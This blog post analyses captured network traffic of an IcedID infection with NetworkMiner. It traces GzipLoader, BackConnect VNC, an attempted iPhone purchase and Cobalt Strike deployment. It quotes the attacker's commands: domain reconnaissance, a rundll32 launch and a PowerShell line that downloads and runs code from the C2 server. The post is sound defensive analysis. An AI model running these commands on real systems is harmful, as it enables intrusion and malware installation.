The BackConnect and VNC parsers that were added to NetworkMiner 2.8.1 provide a unique
possibility to trace the steps of an attacker with help of captured network traffic from a
hacked computer.

In this blog post I use the free and open source version of NetworkMiner to see how
GzipLoader downloads IcedID, after which the attacker deploys BackConnect VNC to
purchase an iPhone 14 with a stolen credit card and then drops Cobalt Strike on the victim
PC.

The analyzed pcap is 2022-10-31-IcedID-with-DarkVNC-and-Cobalt-Strike-full-pcap-
raw.pcap from Brad Duncan's malware-traffic-analysis.net blog.

Safety First

I ran NetworkMiner in a Windows Sandbox when analyzing this PCAP file to avoid
accidentally infecting my computer with any of the malicious artifacts that NetworkMiner
extracts from the network traffic.

Another safe way to analyze Windows malware is to run NetworkMiner in Linux or macOS.

14:47 GzipLoader

This infection starts with GzipLoader (aka “IcedID Downloader”) reaching out to its C2 server
on vgiragdoffy[.]com (67.205.184.237:80) to download IcedID.

The “_gat” cookie value in frame number 6 tells us that the victim machine is running a
Windows 10 build 19045 (aka 22H2). The long “_u” value contains the victim’s username
and hostname in hexadecimal representation and the “__io” value is the logged in user’s
SID. NetworkMiner decodes these values from the GzipLoader request and displays them in
the Hosts tab.

For more info about the GzipLoader cookie, see IcedID PhotoLoader evolution by Jason
Reaves and the eSentire blog post on Gootloader and IcedID.

The response for this GzipLoader request is a 550 kB file (MD5
700c602086590b05dde8df57933c7e68) with a fake gzip header. This file actually contains
the IcedID DLL (Odwikp.dll) and license.dat files.

14:47 IcedID

The banking trojan IcedID (aka BokBot) gets launched at 14:47:29 UTC (frame 641) after
which it connects to these four IcedID servers used for payload delivery and C2:

ringashopsu[.]com = 137.184.208.116
sainforgromset[.]com = 138.68.255.102
yeloypod[.]hair = 94.140.114.103
airsaintol[.]beauty = 66.63.168.75

4/18



 

Image: JA3S hash of C2 server
These four IcedID servers all run TLS servers with self signed certificates issued for
"localhost" and doing TLS handshakes with JA3S hash
ec74a5c51106f0419184d0dd08fb05bc. Both these properties can be used as filters in
NetworkMiner's Hosts tab to only display the IcedID C2 servers.

14:59 BackConnect and Keyhole VNC

Shortly after the IcedID C2 traffic has been started the IcedID bot also initiates BackConnect
C2 connections to 137.74.104.108 on TCP port 8080 (frame 4505 at 14:59:14 UTC).

6/18

The BackConnect C2 server tells the bot to sleep for 60 seconds two times before launching
a reverse VNC session with command 0x11 (frame 4530 at 15:01.09 UTC).

Image: Attacker’s keystrokes extracted from BackConnect VNC traffic
The keylog of the attacker above reveals that the attacker is typing “iphone 14 apple store
buy”. The VNC graphics that NetworkMiner extracted from the PCAP file additionally reveal
that this was a Google search query typed into an Edge browser.

15:10 Credit Card payment

The attacker proceeds to the Apple Store, puts a black iPhone 14 Plus for $987.99 into the
shopping cart, enters a delivery address in West Hartford (US) and then inputs credit card
details for the payment.

11/18

Luckily, the transaction was denied by Apple Store.

15:12 Reverse Shell

After having failed to buy an iPhone through the hacked computer the attacker instead
deploys three reverse shell sessions using the BackConnect C2 channel.

12/18



These three commands are issued in the first reverse shell session:

net group "domain admins" /dom
arp -a  
dir \\17 2.16.0.12\c$

In the second shell session the attacker first runs these three commands:

shell net group "domain admins" /dom
net group "domain admins" /dom  
nltest /domain_trusts /all_trusts  

...and then starts a file manager session through the BackConnect C2 channel.

15:40 Deploy Cobalt Strike

The BackConnect file manager is used to upload a Cobalt Strike binary called P2.dll to
"C:\ProgramData\" on the victim computer in frame 144535.

13/18

The uploaded P2.dll is then executed by running this command in the reverse shell session
(frame 144707):

rundll32 c:\programdata\P2.dll,DllRegisterServer

NetworkMiner extracts this uploaded DLL from the BackConnect network traffic.

15/18



 As you can see in the screenshot above, the MD5 hash of

P2.dll is cc69a31a067b62dda5f2076f8ee335e1. This file is flagged as malicious by most AV
vendors (P2.dll on VT). However, none of them label it as Cobalt Strike. Luckily I was able to
use Triage's malware config extractor to verify that this was indeed Cobalt Strike (P2.dll on
tria.ge). Triage also revealed that the CobaltStrike C2 URL was 
clouditsoft[.]com:8008/static-directory/mg.jpg

After the DLL gets executed the victim PC establishes Cobalt Strike beacon C2 connections
to clouditsoft[.]com on port 8008 (frame 144715).

15:41 MOAR COBALT STRIKE

16/18



The BackConnect Reverse Shell log in NetworkMiner's Parameters tab shows that the
attacker also attempted to download Cobalt Strike using PowerShell at 15:41:59 UTC (frame
145176) with this command:

C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c "IEX
((new-object net.webclient).downloadstring('https://clouditsoft[.]com:8008/lass'))"
